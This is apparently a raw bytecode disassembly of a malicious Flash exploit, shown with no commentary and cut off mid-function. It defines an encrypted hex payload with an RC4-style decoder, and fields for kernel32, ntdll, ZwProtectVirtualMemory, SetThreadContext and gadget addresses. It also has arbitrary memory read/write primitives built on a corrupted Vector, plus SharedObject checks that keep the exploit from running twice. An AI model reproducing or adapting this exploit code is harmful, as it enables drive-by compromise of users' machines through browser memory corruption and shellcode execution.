     var private::m_trg:String = "42ee4b892986a326ea5aad1017918a235b0c5e940c449a9d40a585ce8f7b9a0ae8b6f4f0af281700b2064a6015fc0f16389e3bb2881c7d8a66f795488b3433d998be87f7992abb833329d2e086f134a908510b82dec1db1f822db7bf25cd27e9983aaf2587188597a0dc02d58017a28899dfa5a68d6b7797a4ff008e9dde631865690065d4958b51209335a5fe4f4f25ad74a21ff75a49ba1d85c88382baaa283e7eba819b33868d30a02c7983f41566b7560e51ed24acc663c38a1169ecefeca6248054fdc51e35e024f97a7673f464d9da093c94cdb2c8f53f2edaab1f51ae62d8560ef63c87f642b1b19cf6e756439a9d25f4c017ff7c4db8e757b6be7c6f"	/* slot_id 0 */
     var private::work:flash.utils::Timer	/* slot_id 0 */
     var s:__AS3__.vec::Vector.<Object>	/* slot_id 0 */
     var tf:flash.text::TextField	/* slot_id 0 */
     var private::found:Boolean = false	/* slot_id 0 */
     var private::m_mark:Boolean = false	/* slot_id 0 */
     var private::repeat:uint = 4096	/* slot_id 0 */
     var m_status:* = 0	/* slot_id 0 */
     var private::m_longArrBase:uint = 0	/* slot_id 0 */
     var private::m_longArrIdx:uint = 0	/* slot_id 0 */
     var private::m_flashBase:uint = 0	/* slot_id 0 */
     var private::m_flashVirtual:uint = 0	/* slot_id 0 */
     var private::m_kernel32Base:uint = 0	/* slot_id 0 */
     var private::m_ntdllBase:uint = 0	/* slot_id 0 */
     var private::m_ZwProtectAddr:uint = 0	/* slot_id 0 */
     var private::m_xchgInstAddr:uint = 0	/* slot_id 0 */
     var private::m_SetThreadContext:uint = 0	/* slot_id 0 */
     var m_iver:String	/* slot_id 0 */
     var org:String = "vector"	/* slot_id 0 */
     var m_mySo:flash.net::SharedObject	/* slot_id 0 */
     var m_Ostring:String = "Pidj7gbU"	/* slot_id 0 */
     var m_rawLen:* = 0	/* slot_id 0 */
     var m_suf:* = 90466	/* slot_id 0 */

     function private::ShareObjEx():Boolean	/* disp_id=0 method_id=1 nameIndex = 46 */
     {
       // local_count=2 max_scope=1 max_stack=2 code_len=38
       // method position=5309 code position=5721
       0    getlocal0     	
       1    pushscope     	
       2    findpropstrict	Date //nameIndex = 68
       4    constructprop 	Date (0) //nameIndex = 68
       7    callproperty  	http://adobe.com/AS3/2006/builtin::getTime (0) //nameIndex = 69
       10   coerce_a      	
       11   setlocal1     	
       12   getlocal0     	
       13   getproperty   	m_mySo //nameIndex = 41
       15   getproperty   	data //nameIndex = 70
       17   getlocal0     	
       18   getproperty   	m_Ostring //nameIndex = 43
       20   setproperty   	Cookie //nameIndex = 71
       22   getlocal0     	
       23   getproperty   	m_mySo //nameIndex = 41
       25   getproperty   	data //nameIndex = 70
       27   getlocal1     	
       28   setproperty   	newDate //nameIndex = 72
       30   getlocal0     	
       31   getproperty   	m_mySo //nameIndex = 41
       33   callpropvoid  	flush (0) //nameIndex = 73
       36   pushtrue      	
       37   returnvalue   	
     }

     function private::DetmineCookie():Boolean	/* disp_id=0 method_id=2 nameIndex = 47 */
     {
       // local_count=1 max_scope=1 max_stack=2 code_len=52
       // method position=5313 code position=5767
       0    getlocal0     	
       1    pushscope     	
       2    getlocal0     	
       3    getproperty   	m_mySo //nameIndex = 41
       5    getproperty   	data //nameIndex = 70
       7    pushstring    	"Cookie"
       9    callproperty  	http://adobe.com/AS3/2006/builtin::hasOwnProperty (1) //nameIndex = 74
       12   convert_b     	
       13   dup           	
       14   iffalse       	L1

       18   pop           	
       19   getlocal0     	
       20   getproperty   	m_mySo //nameIndex = 41
       22   getproperty   	data //nameIndex = 70
       24   pushstring    	"newDate"
       26   callproperty  	http://adobe.com/AS3/2006/builtin::hasOwnProperty (1) //nameIndex = 74
       29   convert_b     	
       
       L1: 
       30   iffalse       	L2

       34   getlocal0     	
       35   getproperty   	m_mySo //nameIndex = 41
       37   getproperty   	data //nameIndex = 70
       39   getproperty   	Cookie //nameIndex = 71
       41   getlocal0     	
       42   getproperty   	m_Ostring //nameIndex = 43
       44   ifne          	L2

       48   pushtrue      	
       49   returnvalue   	
       
       L2: 
       50   pushfalse     	
       51   returnvalue   	
     }

     function setArrValue(uint,uint,uint):void	/* disp_id=0 method_id=3 nameIndex = 48 */
     {
       // local_count=4 max_scope=1 max_stack=6 code_len=110
       // method position=5317 code position=5827
       0    getlocal0     	
       1    pushscope     	
       2    getlocal2     	
       3    pushbyte      	2
       5    bitand        	
       6    iffalse       	L1

       10   getlocal0     	
       11   getproperty   	s //nameIndex = 23
       13   getlocal1     	
       14   getproperty   	null //nameIndex = 75
       16   getlocal2     	
       17   pushbyte      	2
       19   subtract      	
       20   pushbyte      	4
       22   divide        	
       23   getlocal3     	
       24   pushint       	65535	// 0xffff
       26   bitand        	
       27   pushbyte      	16
       29   lshift        	
       30   getlocal0     	
       31   getproperty   	s //nameIndex = 23
       33   getlocal1     	
       34   getproperty   	null //nameIndex = 75
       36   getlocal2     	
       37   pushbyte      	2
       39   subtract      	
       40   pushbyte      	4
       42   divide        	
       43   getproperty   	null //nameIndex = 75
       45   pushint       	65535	// 0xffff
       47   bitand        	
       48   bitor         	
       49   setproperty   	null //nameIndex = 75
       51   getlocal0     	
       52   getproperty   	s //nameIndex = 23
       54   getlocal1     	
       55   getproperty   	null //nameIndex = 75
       57   getlocal2     	
       58   pushbyte      	2
       60   add           	
       61   pushbyte      	4
       63   divide        	
       64   getlocal0     	
       65   getproperty   	s //nameIndex = 23
       67   getlocal1     	
       68   getproperty   	null //nameIndex = 75
       70   getlocal2     	
       71   pushbyte      	2
       73   add           	
       74   pushbyte      	4
       76   divide        	
       77   getproperty   	null //nameIndex = 75
       79   pushdouble    	4294901760
       81   bitand        	
       82   getlocal3     	
       83   pushdouble    	4294901760
       85   bitand        	
       86   pushbyte      	16
       88   rshift        	
       89   bitor         	
       90   setproperty   	null //nameIndex = 75
       92   jump          	L2
       
       L1: 
       96   getlocal0     	
       97   getproperty   	s //nameIndex = 23
       99   getlocal1     	
       100  getproperty   	null //nameIndex = 75
       102  getlocal2     	
       103  pushbyte      	4
       105  divide        	
       106  getlocal3     	
       107  setproperty   	null //nameIndex = 75
       
       L2: 
       109  returnvoid    	
     }

     function free():*	/* disp_id=0 method_id=4 nameIndex = 49 */
     {
       // local_count=2 max_scope=1 max_stack=3 code_len=77
       // method position=5324 code position=5945
       0    getlocal0     	
       1    pushscope     	
       2    pushbyte      	0
       4    convert_u     	
       5    setlocal1     	
       6    jump          	L1

       
       L2: 
       10   label         	
       11   getlocal0     	
       12   getproperty   	s //nameIndex = 23
       14   getlocal1     	
       15   pushnull      	
       16   setproperty   	null //nameIndex = 75
       18   getlocal1     	
       19   increment     	
       20   convert_u     	
       21   setlocal1     	
       
       L1: 
       22   getlocal1     	
       23   getlocal0     	
       24   getproperty   	m_suf //nameIndex = 45
       26   iflt          	L2

       30   getlocal0     	
       31   pushnull      	
       32   setproperty   	s //nameIndex = 23
       34   pushbyte      	0
       36   convert_u     	
       37   setlocal1     	
       38   jump          	L3

       
       L4: 
       42   label         	
       43   getlocal0     	
       44   getproperty   	ss //nameIndex = 12
       46   getlocal1     	
       47   pushnull      	
       48   setproperty   	null //nameIndex = 75
       50   getlocal1     	
       51   increment     	
       52   convert_u     	
       53   setlocal1     	
       
       L3: 
       54   getlocal1     	
       55   getlocal0     	
       56   getproperty   	ss //nameIndex = 12
       58   getproperty   	length //nameIndex = 76
       60   iflt          	L4

       64   getlocal0     	
       65   pushnull      	
       66   setproperty   	ss //nameIndex = 12
       68   getlex        	flash.external::ExternalInterface //nameIndex = 77
       70   pushstring    	"fl"
       72   pushnull      	
       73   callpropvoid  	call (2) //nameIndex = 78
       76   returnvoid    	
     }

     function private::hexToIntArray(String):__AS3__.vec::Vector.<int>	/* disp_id=0 method_id=6 nameIndex = 50 */
     {
       // local_count=7 max_scope=1 max_stack=5 code_len=99
       // method position=5332 code position=7366
       0    getlocal0     	
       1    pushscope     	
       2    pushnull      	
       3    coerce_a      	
       4    setlocal2     	
       5    getlocal1     	
       6    getproperty   	length //nameIndex = 76
       8    coerce_a      	
       9    setlocal3     	
       10   pushbyte      	0
       12   coerce_a      	
       13   setlocal      	4
       15   getlex        	Vector //nameIndex = 82
       17   getlex        	int //nameIndex = 5
       19   applytype     	(1)
       21   getlocal3     	
       22   pushbyte      	2
       24   divide        	
       25   construct     	(1)
       27   coerce        	__AS3__.vec::Vector.<int> //nameIndex = 6
       29   setlocal      	5
       31   pushbyte      	0
       33   coerce_a      	
       34   setlocal      	6
       36   jump          	L1

       
       L2: 
       40   label         	
       41   getlocal1     	
       42   getlocal      	4
       44   callproperty  	http://adobe.com/AS3/2006/builtin::charAt (1) //nameIndex = 89
       47   getlocal1     	
       48   getlocal      	4
       50   pushbyte      	1
       52   add           	
       53   callproperty  	http://adobe.com/AS3/2006/builtin::charAt (1) //nameIndex = 89
       56   add           	
       57   coerce_a      	
       58   setlocal2     	
       59   getlocal      	5
       61   getlocal      	6
       63   findpropstrict	parseInt //nameIndex = 90
       65   getlocal2     	
       66   pushbyte      	16
       68   callproperty  	parseInt (2) //nameIndex = 90
       71   setproperty   	null //nameIndex = 75
       73   getlocal      	4
       75   pushbyte      	2
       77   add           	
       78   coerce_a      	
       79   setlocal      	4
       81   getlocal      	6
       83   pushbyte      	1
       85   add           	
       86   coerce_a      	
       87   setlocal      	6
       
       L1: 
       89   getlocal      	4
       91   getlocal3     	
       92   iflt          	L2

       96   getlocal      	5
       98   returnvalue   	
     }

     function private::decode(String):flash.utils::ByteArray	/* disp_id=0 method_id=7 nameIndex = 51 */
     {
       // local_count=14 max_scope=1 max_stack=5 code_len=329
       // method position=5337 code position=7473
       0    getlocal0     	
       1    pushscope     	
       2    pushbyte      	0
       4    setlocal      	6
       6    pushbyte      	0
       8    setlocal      	8
       10   pushundefined 	
       11   coerce_a      	
       12   setlocal      	9
       14   pushbyte      	0
       16   setlocal      	13
       18   getlex        	Vector //nameIndex = 82
       20   getlex        	int //nameIndex = 5
       22   applytype     	(1)
       24   pushshort     	256
       27   construct     	(1)
       29   coerce        	__AS3__.vec::Vector.<int> //nameIndex = 6
       31   setlocal2     	
       32   getlex        	Vector //nameIndex = 82
       34   getlex        	int //nameIndex = 5
       36   applytype     	(1)
       38   pushshort     	256
       41   construct     	(1)
       43   coerce        	__AS3__.vec::Vector.<int> //nameIndex = 6
       45   setlocal3     	
       46   getlocal0     	
       47   getlocal0     	
       48   getproperty   	private::m_keys //nameIndex = 19
       50   callproperty  	private::hexToIntArray (1) //nameIndex = 50
       53   coerce        	__AS3__.vec::Vector.<int> //nameIndex = 6
       55   dup           	
       56   setlocal      	4
       58   getproperty   	length //nameIndex = 76
       60   convert_i     	
       61   setlocal      	5
       63   pushbyte      	0
       65   setlocal      	6
       67   jump          	L1

       
       L2: 
       71   label         	
       72   getlocal2     	
       73   getlocal      	6
       75   getlocal      	6
       77   setproperty   	null //nameIndex = 75
       79   getlocal3     	
       80   getlocal      	6
       82   getlocal      	4
       84   getlocal      	6
       86   getlocal      	5
       88   modulo        	
       89   getproperty   	null //nameIndex = 75
       91   setproperty   	null //nameIndex = 75
       93   inclocal_i    	6
       
       L1: 
       95   getlocal      	6
       97   pushshort     	256
       100  iflt          	L2

       104  pushbyte      	0
       106  setlocal      	7
       108  pushbyte      	0
       110  coerce_a      	
       111  setlocal      	9
       113  jump          	L3

       
       L4: 
       117  label         	
       118  getlocal      	7
       120  getlocal2     	
       121  getlocal      	9
       123  getproperty   	null //nameIndex = 75
       125  add           	
       126  getlocal3     	
       127  getlocal      	9
       129  getproperty   	null //nameIndex = 75
       131  add           	
       132  pushshort     	255
       135  bitand        	
       136  setlocal      	7
       138  getlocal2     	
       139  getlocal      	9
       141  getproperty   	null //nameIndex = 75
       143  convert_i     	
       144  setlocal      	8
       146  getlocal2     	
       147  getlocal      	9
       149  getlocal2     	
       150  getlocal      	7
       152  getproperty   	null //nameIndex = 75
       154  setproperty   	null //nameIndex = 75
       156  getlocal2     	
       157  getlocal      	7
       159  getlocal      	8
       161  setproperty   	null //nameIndex = 75
       163  getlocal      	9
       165  increment     	
       166  coerce_a      	
       167  setlocal      	9
       
       L3: 
       169  getlocal      	9
       171  pushshort     	256
       174  iflt          	L4

       178  findpropstrict	flash.utils::ByteArray //nameIndex = 8
       180  constructprop 	flash.utils::ByteArray (0) //nameIndex = 8
       183  coerce        	flash.utils::ByteArray //nameIndex = 8
       185  dup           	
       186  setlocal      	10
       188  getlex        	flash.utils::Endian //nameIndex = 91
       190  getproperty   	LITTLE_ENDIAN //nameIndex = 92
       192  setproperty   	endian //nameIndex = 93
       194  getlocal0     	
       195  getlocal1     	
       196  callproperty  	private::hexToIntArray (1) //nameIndex = 50
       199  coerce        	__AS3__.vec::Vector.<int> //nameIndex = 6
       201  setlocal      	11
       203  pushbyte      	0
       205  setlocal      	6
       207  pushbyte      	0
       209  setlocal      	12
       211  pushbyte      	0
       213  coerce_a      	
       214  setlocal      	9
       216  jump          	L5

       
       L6: 
       220  label         	
       221  getlocal      	6
       223  pushbyte      	1
       225  add           	
       226  pushshort     	255
       229  bitand        	
       230  setlocal      	6
       232  getlocal      	12
       234  getlocal2     	
       235  getlocal      	6
       237  getproperty   	null //nameIndex = 75
       239  add           	
       240  pushshort     	255
       243  bitand        	
       244  setlocal      	12
       246  getlocal2     	
       247  getlocal      	6
       249  getproperty   	null //nameIndex = 75
       251  convert_i     	
       252  setlocal      	8
       254  getlocal2     	
       255  getlocal      	6
       257  getlocal2     	
       258  getlocal      	12
       260  getproperty   	null //nameIndex = 75
       262  setproperty   	null //nameIndex = 75
       264  getlocal2     	
       265  getlocal      	12
       267  getlocal      	8
       269  setproperty   	null //nameIndex = 75
       271  getlocal2     	
       272  getlocal      	6
       274  getproperty   	null //nameIndex = 75
       276  getlocal2     	
       277  getlocal      	12
       279  getproperty   	null //nameIndex = 75
       281  add           	
       282  pushshort     	255
       285  bitand        	
       286  setlocal      	13
       288  getlocal2     	
       289  getlocal      	13
       291  getproperty   	null //nameIndex = 75
       293  convert_i     	
       294  setlocal      	8
       296  getlocal      	10
       298  getlocal      	11
       300  getlocal      	9
       302  getproperty   	null //nameIndex = 75
       304  getlocal      	8
       306  bitxor        	
       307  callpropvoid  	writeByte (1) //nameIndex = 94
       310  getlocal      	9
       312  increment     	
       313  coerce_a      	
       314  setlocal      	9
       
       L5: 
       316  getlocal      	9
       318  getlocal      	11
       320  getproperty   	length //nameIndex = 76
       322  iflt          	L6

       326  getlocal      	10
       328  returnvalue   	
     }

     function outInfo(String):void	/* disp_id=0 method_id=8 nameIndex = 52 */
     {
       // local_count=2 max_scope=1 max_stack=1 code_len=3
       // method position=5342 code position=7811
       0    getlocal0     	
       1    pushscope     	
       2    returnvoid    	
     }

     function private::read32(uint):uint	/* disp_id=0 method_id=9 nameIndex = 53 */
     {
       // local_count=2 max_scope=1 max_stack=4 code_len=62
       // method position=5347 code position=7822
       0    getlocal0     	
       1    pushscope     	
       2    getlocal1     	
       3    pushbyte      	4
       5    modulo        	
       6    iffalse       	L1

       10   pushbyte      	0
       12   returnvalue   	
       
       L1: 
       13   getlocal1     	
       14   getlocal0     	
       15   getproperty   	private::m_longArrBase //nameIndex = 30
       17   ifnge         	L2

       21   getlocal0     	
       22   getproperty   	s //nameIndex = 23
       24   getlocal0     	
       25   getproperty   	private::m_longArrIdx //nameIndex = 31
       27   getproperty   	null //nameIndex = 75
       29   getlocal1     	
       30   getlocal0     	
       31   getproperty   	private::m_longArrBase //nameIndex = 30
       33   subtract      	
       34   pushbyte      	4
       36   divide        	
       37   getproperty   	null //nameIndex = 75
       39   returnvalue   	
       
       L2: 
       40   getlocal0     	
       41   getproperty   	s //nameIndex = 23
       43   getlocal0     	
       44   getproperty   	private::m_longArrIdx //nameIndex = 31
       46   getproperty   	null //nameIndex = 75
       48   pushint       	1073741824	// 0x40000000
       50   getlocal0     	
       51   getproperty   	private::m_longArrBase //nameIndex = 30
       53   getlocal1     	
       54   subtract      	
       55   pushbyte      	4
       57   divide        	
       58   subtract      	
       59   getproperty   	null //nameIndex = 75
       61   returnvalue   	
     }

     function private::write32(uint,uint):void	/* disp_id=0 method_id=10 nameIndex = 54 */
     {
       // local_count=3 max_scope=1 max_stack=4 code_len=65
       // method position=5352 code position=7892
       0    getlocal0     	
       1    pushscope     	
       2    getlocal1     	
       3    pushbyte      	4
       5    modulo        	
       6    iffalse       	L1

       10   returnvoid    	
       
       L1: 
       11   getlocal1     	
       12   getlocal0     	
       13   getproperty   	private::m_longArrBase //nameIndex = 30
       15   ifnge         	L2

       19   getlocal0     	
       20   getproperty   	s //nameIndex = 23
       22   getlocal0     	
       23   getproperty   	private::m_longArrIdx //nameIndex = 31
       25   getproperty   	null //nameIndex = 75
       27   getlocal1     	
       28   getlocal0     	
       29   getproperty   	private::m_longArrBase //nameIndex = 30
       31   subtract      	
       32   pushbyte      	4
       34   divide        	
       35   getlocal2     	
       36   setproperty   	null //nameIndex = 75
       38   jump          	L3
       
       L2: 
       42   getlocal0     	
       43   getproperty   	s //nameIndex = 23
       45   getlocal0     	
       46   getproperty   	private::m_longArrIdx //nameIndex = 31
       48   getproperty   	null //nameIndex = 75
       50   pushint       	1073741824	// 0x40000000
       52   getlocal0     	
       53   getproperty   	private::m_longArrBase //nameIndex = 30
       55   getlocal1     	
       56   subtract      	
       57   pushbyte      	4
       59   divide        	
       60   subtract      	
       61   getlocal2     	
       62   setproperty   	null //nameIndex = 75
       
       L3: 
       64   returnvoid    	
     }

     function private::read8(uint):uint	/* disp_id=0 method_id=11 nameIndex = 55 */
     {
       // local_count=4 max_scope=1 max_stack=3 code_len=152
       // method position=5358 code position=7965
       0    getlocal0     	
       1    pushscope     	
       2    getlocal0     	
       3    getlocal1     	
       4    pushdouble    	4294967292
       6    bitand        	
       7    callproperty  	private::read32 (1) //nameIndex = 53
       10   convert_u     	
       11   setlocal2     	
       12   jump          	L1

       
       L2: 
       16   label         	
       17   getlocal2     	
       18   pushshort     	255
       21   bitand        	
       22   returnvalue   	
       
       L3: 
       23   label         	
       24   getlocal2     	
       25   pushbyte      	8
       27   rshift        	
       28   pushshort     	255
       31   bitand        	
       32   returnvalue   	
       
       L4: 
       33   label         	
       34   getlocal2     	
       35   pushbyte      	16
       37   rshift        	
       38   pushshort     	255
       41   bitand        	
       42   returnvalue   	
       
       L5: 
       43   label         	
       44   getlocal2     	
       45   pushbyte      	24
       47   rshift        	
       48   pushshort     	255
       51   bitand        	
       52   returnvalue   	
       
       L6: 
       53   label         	
       54   jump          	L7
       
       L1: 
       58   getlocal1     	
       59   pushbyte      	4
       61   modulo        	
       62   setlocal3     	
       63   pushbyte      	0
       65   getlocal3     	
       66   ifstrictne    	L8

       70   pushbyte      	0
       72   jump          	L9
       
       L8: 
       76   pushbyte      	1
       78   getlocal3     	
       79   ifstrictne    	L10

       83   pushbyte      	1
       85   jump          	L9
       
       L10: 
       89   pushbyte      	2
       91   getlocal3     	
       92   ifstrictne    	L11

       96   pushbyte      	2
       98   jump          	L9
       
       L11: 
       102  pushbyte      	3
       104  getlocal3     	
       105  ifstrictne    	L12

       109  pushbyte      	3
       111  jump          	L9
       
       L12: 
       115  jump          	L13

       119  pushbyte      	4
       121  jump          	L9
       
       L13: 
       125  pushbyte      	4
       
       L9: 
       127  kill          	3
       129  lookupswitch  	default:L6 maxcase:4 L2 L3 L4 L5 L6
       
       L7: 
       149  pushbyte      	0
       151  returnvalue   	
     }

     function private::read16(uint):uint	/* disp_id=0 method_id=12 nameIndex = 56 */
     {
       // local_count=4 max_scope=1 max_stack=3 code_len=155
       // method position=5363 code position=8126
       0    getlocal0     	
       1    pushscope     	
       2    getlocal1     	
       3    pushbyte      	2
       5    modulo        	
       6    iffalse       	L1

       10   pushbyte      	0
       12   returnvalue   	
       
       L1: 
       13   getlocal0     	
       14   getlocal1     	
       15   pushdouble    	4294967292
       17   bitand        	
       18   callproperty  	private::read32 (1) //nameIndex = 53
       21   convert_u     	
       22   setlocal2     	
       23   jump          	L2

       
       L3: 
       27   label         	
       28   getlocal2     	
       29   pushint       	65535	// 0xffff
       31   bitand        	
       32   returnvalue   	
       
       L4: 
       33   label         	
       34   getlocal2     	
       35   pushbyte      	8
       37   rshift        	
       38   pushint       	65535	// 0xffff
       40   bitand        	
       41   returnvalue   	
       
       L5: 
       42   label         	
       43   getlocal2     	
       44   pushbyte      	16
       46   rshift        	
       47   pushint       	65535	// 0xffff
       49   bitand        	
       50   returnvalue   	
       
       L6: 
       51   label         	
       52   jump          	L7

       
       L8: 
       56   label         	
       57   jump          	L7
       
       L2: 
       61   getlocal1     	
       62   pushbyte      	4
       64   modulo        	
       65   setlocal3     	
       66   pushbyte      	0
       68   getlocal3     	
       69   ifstrictne    	L9

       73   pushbyte      	0
       75   jump          	L10
       
       L9: 
       79   pushbyte      	1
       81   getlocal3     	
       82   ifstrictne    	L11

       86   pushbyte      	1
       88   jump          	L10
       
       L11: 
       92   pushbyte      	2
       94   getlocal3     	
       95   ifstrictne    	L12

       99   pushbyte      	2
       101  jump          	L10
       
       L12: 
       105  pushbyte      	3
       107  getlocal3     	
       108  ifstrictne    	L13

       112  pushbyte      	3
       114  jump          	L10
       
       L13: 
       118  jump          	L14

       122  pushbyte      	4
       124  jump          	L10
       
       L14: 
       128  pushbyte      	4
       
       L10: 
       130  kill          	3
       132  lookupswitch  	default:L8 maxcase:4 L3 L4 L5 L6 L8
       
       L7: 
       152  pushbyte      	0
       154  returnvalue   	
     }

     function private::write8(uint,uint):void	/* disp_id=0 method_id=13 nameIndex = 57 */
     {
       // local_count=6 max_scope=1 max_stack=3 code_len=214
       // method position=5368 code position=8290
       0    getlocal0     	
       1    pushscope     	
       2    pushbyte      	0
       4    convert_u     	
       5    setlocal      	4
       7    getlocal0     	
       8    getlocal1     	
       9    pushdouble    	4294967292
       11   bitand        	
       12   callproperty  	private::read32 (1) //nameIndex = 53
       15   convert_u     	
       16   setlocal3     	
       17   jump          	L1

       
       L2: 
       21   label         	
       22   getlocal3     	
       23   pushdouble    	4294967040
       25   bitand        	
       26   getlocal2     	
       27   pushshort     	255
       30   bitand        	
       31   bitor         	
       32   convert_u     	
       33   setlocal      	4
       35   jump          	L3

       
       L4: 
       39   label         	
       40   getlocal3     	
       41   pushdouble    	4294902015
       43   bitand        	
       44   getlocal2     	
       45   pushshort     	255
       48   bitand        	
       49   pushbyte      	8
       51   lshift        	
       52   bitor         	
       53   convert_u     	
       54   setlocal      	4
       56   jump          	L3

       
       L5: 
       60   label         	
       61   getlocal3     	
       62   pushdouble    	4278255615
       64   bitand        	
       65   getlocal2     	
       66   pushshort     	255
       69   bitand        	
       70   pushbyte      	16
       72   lshift        	
       73   bitor         	
       74   convert_u     	
       75   setlocal      	4
       77   jump          	L3

       
       L6: 
       81   label         	
       82   getlocal3     	
       83   pushint       	16777215	// 0xffffff
       85   bitand        	
       86   getlocal2     	
       87   pushshort     	255
       90   bitand        	
       91   pushbyte      	24
       93   lshift        	
       94   bitor         	
       95   convert_u     	
       96   setlocal      	4
       98   jump          	L3

       
       L7: 
       102  label         	
       103  jump          	L3
       
       L1: 
       107  getlocal1     	
       108  pushbyte      	4
       110  modulo        	
       111  setlocal      	5
       113  pushbyte      	0
       115  getlocal      	5
       117  ifstrictne    	L8

       121  pushbyte      	0
       123  jump          	L9
       
       L8: 
       127  pushbyte      	1
       129  getlocal      	5
       131  ifstrictne    	L10

       135  pushbyte      	1
       137  jump          	L9
       
       L10: 
       141  pushbyte      	2
       143  getlocal      	5
       145  ifstrictne    	L11

       149  pushbyte      	2
       151  jump          	L9
       
       L11: 
       155  pushbyte      	3
       157  getlocal      	5
       159  ifstrictne    	L12

       163  pushbyte      	3
       165  jump          	L9
       
       L12: 
       169  jump          	L13

       173  pushbyte      	4
       175  jump          	L9
       
       L13: 
       179  pushbyte      	4
       
       L9: 
       181  kill          	5
       183  lookupswitch  	default:L7 maxcase:4 L2 L4 L5 L6 L7
       
       L3: 
       203  getlocal0     	
       204  getlocal1     	
       205  pushdouble    	4294967292
       207  bitand        	
       208  getlocal      	4
       210  callpropvoid  	private::write32 (2) //nameIndex = 54
       213  returnvoid    	
     }

     function private::writeBytes(uint,flash.utils::ByteArray):void	/* disp_id=0 method_id=14 nameIndex = 58 */
     {
       // local_count=5 max_scope=1 max_stack=4 code_len=127
       // method position=5374 code position=8513
       0    getlocal0     	
       1    pushscope     	
       2    pushbyte      	0
       4    convert_u     	
       5    setlocal      	4
       7    pushbyte      	0
       9    coerce_a      	
       10   setlocal3     	
       11   jump          	L1

       
       L2: 
       15   label         	
       16   getlocal2     	
       17   getlocal3     	
       18   getproperty   	null //nameIndex = 75
       20   pushshort     	255
       23   bitand        	
       24   getlocal2     	
       25   getlocal3     	
       26   pushbyte      	1
       28   add           	
       29   getproperty   	null //nameIndex = 75
       31   pushshort     	255
       34   bitand        	
       35   pushbyte      	8
       37   lshift        	
       38   bitor         	
       39   getlocal2     	
       40   getlocal3     	
       41   pushbyte      	2
       43   add           	
       44   getproperty   	null //nameIndex = 75
       46   pushshort     	255
       49   bitand        	
       50   pushbyte      	16
       52   lshift        	
       53   bitor         	
       54   getlocal2     	
       55   getlocal3     	
       56   pushbyte      	3
       58   add           	
       59   getproperty   	null //nameIndex = 75
       61   pushshort     	255
       64   bitand        	
       65   pushbyte      	24
       67   lshift        	
       68   bitor         	
       69   convert_u     	
       70   setlocal      	4
       72   getlocal0     	
       73   getlocal1     	
       74   getlocal3     	
       75   add           	
       76   getlocal      	4
       78   callpropvoid  	private::write32 (2) //nameIndex = 54
       81   getlocal3     	
       82   pushbyte      	4
       84   add           	
       85   coerce_a      	
       86   setlocal3     	
       
       L1: 
       87   getlocal3     	
       88   pushbyte      	3
       90   add           	
       91   getlocal2     	
       92   getproperty   	length //nameIndex = 76
       94   iflt          	L2

       98   jump          	L3

       
       L4: 
       102  label         	
       103  getlocal0     	
       104  getlocal1     	
       105  getlocal3     	
       106  add           	
       107  getlocal2     	
       108  getlocal3     	
       109  getproperty   	null //nameIndex = 75
       111  callpropvoid  	private::write8 (2) //nameIndex = 57
       114  getlocal3     	
       115  increment     	
       116  coerce_a      	
       117  setlocal3     	
       
       L3: 
       118  getlocal3     	
       119  getlocal2     	
       120  getproperty   	length //nameIndex = 76
       122  iflt          	L4

       126  returnvoid    	
     }

     function private::writeUnicodeString(uint,String):void	/* disp_id=0 method_id=15 nameIndex = 59 */
     {
       // local_count=5 max_scope=1 max_stack=3 code_len=60
       // method position=5380 code position=8648
       0    getlocal0     	
       1    pushscope     	
       2    findpropstrict	flash.utils::ByteArray //nameIndex = 8
       4    constructprop 	flash.utils::ByteArray (0) //nameIndex = 8
       7    coerce        	flash.utils::ByteArray //nameIndex = 8
       9    setlocal3     	
       10   getlocal3     	
       11   getlex        	flash.utils::Endian //nameIndex = 91
       13   getproperty   	LITTLE_ENDIAN //nameIndex = 92
       15   setproperty   	endian //nameIndex = 93
       17   pushbyte      	0
       19   setlocal      	4
       21   jump          	L1

       
       L2: 
       25   label         	
       26   getlocal3     	
       27   getlocal2     	
       28   getlocal      	4
       30   callproperty  	http://adobe.com/AS3/2006/builtin::charCodeAt (1) //nameIndex = 95
       33   callpropvoid  	writeShort (1) //nameIndex = 96
       36   inclocal_i    	4
       
       L1: 
       38   getlocal      	4
       40   getlocal2     	
       41   getproperty   	length //nameIndex = 76
       43   iflt          	L2

       47   getlocal3     	
       48   pushbyte      	0
       50   callpropvoid  	writeShort (1) //nameIndex = 96
       53   getlocal0     	
       54   getlocal1     	
       55   getlocal3     	
       56   callpropvoid  	private::writeBytes (2) //nameIndex = 58
       59   returnvoid    	
     }

     function private::writeAsciiString(uint,String):void	/* disp_id=0 method_id=16 nameIndex = 60 */
     {
       // local_count=5 max_scope=1 max_stack=3 code_len=39
       // method position=5386 code position=8716
       0    getlocal0     	
       1    pushscope     	
       2    findpropstrict	flash.utils::ByteArray //nameIndex = 8
       4    constructprop 	flash.utils::ByteArray (0) //nameIndex = 8
       7    coerce        	flash.utils::ByteArray //nameIndex = 8
       9    setlocal3     	
       10   getlocal3     	
       11   getlex        	flash.utils::Endian //nameIndex = 91
       13   getproperty   	LITTLE_ENDIAN //nameIndex = 92
       15   setproperty   	endian //nameIndex = 93
       17   pushbyte      	0
       19   setlocal      	4
       21   getlocal3     	
       22   getlocal2     	
       23   callpropvoid  	writeUTFBytes (1) //nameIndex = 97
       26   getlocal3     	
       27   pushbyte      	0
       29   callpropvoid  	writeByte (1) //nameIndex = 94
       32   getlocal0     	
       33   getlocal1     	
       34   getlocal3     	
       35   callpropvoid  	private::writeBytes (2) //nameIndex = 58
       38   returnvoid    	
     }

     function private::asciiStrEqual(uint,String):Boolean	/* disp_id=0 method_id=17 nameIndex = 61 */
     {
       // local_count=5 max_scope=1 max_stack=3 code_len=63
       // method position=5392 code position=8763
       0    getlocal0     	
       1    pushscope     	
       2    findpropstrict	flash.utils::ByteArray //nameIndex = 8
       4    constructprop 	flash.utils::ByteArray (0) //nameIndex = 8
       7    coerce        	flash.utils::ByteArray //nameIndex = 8
       9    setlocal3     	
       10   getlocal3     	
       11   getlex        	flash.utils::Endian //nameIndex = 91
       13   getproperty   	LITTLE_ENDIAN //nameIndex = 92
       15   setproperty   	endian //nameIndex = 93
       17   getlocal3     	
       18   getlocal2     	
       19   callpropvoid  	writeUTFBytes (1) //nameIndex = 97
       22   pushbyte      	0
       24   setlocal      	4
       26   jump          	L1

       
       L2: 
       30   label         	
       31   getlocal0     	
       32   getlocal1     	
       33   getlocal      	4
       35   add           	
       36   callproperty  	private::read8 (1) //nameIndex = 55
       39   getlocal3     	
       40   getlocal      	4
       42   getproperty   	null //nameIndex = 75
       44   ifeq          	L3

